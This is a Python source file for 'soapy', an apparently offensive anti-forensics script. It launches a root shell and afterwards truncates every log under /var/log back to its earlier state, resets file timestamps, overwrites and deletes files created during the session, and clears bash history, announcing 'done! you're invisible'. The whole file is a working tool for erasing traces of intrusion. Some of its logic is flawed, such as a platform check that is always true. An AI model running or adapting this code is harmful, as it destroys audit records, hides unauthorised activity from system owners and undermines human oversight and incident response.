import os
import time
import string
import random
import argparse
import platform

__version__ = "0.2"
__author__ = "Ekultek"
__progname__ = "soapy"
__twitter__ = "@stay__salty"


class Parser(argparse.ArgumentParser):

    def __init__(self):
        super(Parser, self).__init__()

    @staticmethod
    def optparse():
        parser = argparse.ArgumentParser(
            usage="sudo soa.py [-n|-l|-d] PATH|DIR1 DIR2 ..."
        )
        parser.add_argument(
            "-l", "--log", dest="logPath", metavar="PATH",
            help="pass the path to log files (*default=/var/log)"
        )
        parser.add_argument(
            "-d", "--dirs", dest="dirsToCheckAfter", nargs="+", metavar="DIR1 DIR2 ...",
            help="provide directories that you want files deleted out of afterwards (*default=None)"
        )
        parser.add_argument(
            "-n", "--no-prompt", dest="noPrompt", action="store_true", default=False,
            help="delete the files in the provided directory without prompting for deletion (*default=raw_input)"
        )
        return parser.parse_args()


def safe_delete(path, passes=3):
    import struct

    length = os.path.getsize(path)
    data = open(path, "w")
    # fill with random printable characters
    for _ in xrange(passes):
        data.seek(0)
        data.write(''.join(random.choice(string.printable) for _ in range(length)))
    # fill with random data from the OS
    for _ in xrange(passes):
        data.seek(0)
        data.write(os.urandom(length))
    # fill with null bytes
    for _ in xrange(passes):
        data.seek(0)
        data.write(struct.pack("B", 0) * length)
    data.close()
    os.remove(path)


def open_next_terminal():
    import subprocess

    def rand(path="/tmp"):
        acc = string.ascii_letters
        retval = []
        for _ in range(7):
            retval.append(random.choice(acc))
        return "{}/{}.sh".format(path, ''.join(retval))

    file_path = rand()
    with open(file_path, "a+") as data:
        data.write(
'''
#!/bin/bash
"$@"
exec $SHELL
'''
        )
    subprocess.call(["sudo", "bash", "{}".format(file_path)])
    return file_path


def needs_history_cleared():
    if "linux" or "darwin" in str(platform.platform()).lower():
        print("clearing bash history")
        os.system("cat /dev/null > ~/.bash_history && history -c && exit")


def walkdir(path, get_logs=True):
    """
    find the current last lines on the log files
    these will be used as reference later to scrub the logs
    """

    def tails(file_object, last_lines):
        """
        mimics the tail command
        """
        with open(file_object) as file_object:
            assert last_lines >= 0
            pos, lines = last_lines + 1, []
            while len(lines) <= last_lines:
                try:
                    file_object.seek(-pos, 2)
                except IOError:
                    file_object.seek(0)
                    break
                finally:
                    lines = list(file_object)
                pos *= 2
        return "".join(lines[-last_lines:])

    filenames = []
    log_data = []

    for root, subs, files in os.walk(path):
        for name in files:
            filenames.append(os.path.join(root, name))
    if get_logs:
        for f in filenames:
            log_data.append((f, tails(f, 1)))
        return log_data
    else:
        return filenames


def edit_logs(path, identifier, time_change):
    """
    edit the log files back to their previous state and
    change the edit times so that it seems like you weren't
    even there
    """
    with open(path) as log:
        data = log.read()
        index_of_action = data.find(identifier)
        scrubbed = data[0:index_of_action]
    with open(path, "w") as log:
        log.write(scrubbed)
        os.utime(path, (time_change, time_change))


def main():
    """
    main function
    """
    seperator = "*" * 30
    checklist = {}
    check_against = {}
    opt = Parser().optparse()

    flatten = lambda l: [item for sublist in l for item in sublist]

    if opt.dirsToCheckAfter is None:
        print("no directories will be scanned after session is completed")
        check = None
    else:
        check = opt.dirsToCheckAfter

    if check is not None:
        print("gathering current files in provided directories")
        for path in check:
            if path == "/":
                print("root has been passed, this will take awhile")
            checklist[path] = walkdir(path, get_logs=False)

    if opt.logPath is None:
        path = "/var/log"
    else:
        path = opt.logPath
    print("extracting last known log from: '{}'".format(path))
    current_time = time.time()
    current_last_lines = walkdir(path)
    print("log files are being monitored, new root terminal has been launched, type `exit` to leave the terminal.")
    print(seperator)
    file_path = open_next_terminal()
    print(seperator)

    if len(checklist) != 0:
        print("checking for differences in provided directories")
        for path in check:
            check_against[path] = walkdir(path, get_logs=False)
        before = flatten(checklist.values())
        after = flatten(check_against.values())
        differences = set(before) ^ set(after)
        for difference in list(differences):
            if not opt.noPrompt:
                choice = raw_input("found created file: '{}' delete?[y/N]: ".format(difference))
            else:
                choice = "y"
            if choice.lower().startswith("y"):
                safe_delete(difference)
                print("file: '{}' deleted".format(difference))
            else:
                print("keeping file: '{}' on system".format(difference))

    print("soaping up the log files")
    for item in current_last_lines:
        edit_logs(item[0], item[1], current_time)
    print("washing off the soap")
    try:
        safe_delete(file_path)
    except OSError:
        pass
    except Exception:
        print("unable to delete: '{}'".format(file_path))
    needs_history_cleared()
    print("done! you're invisible")


if __name__ == "__main__":
    main()
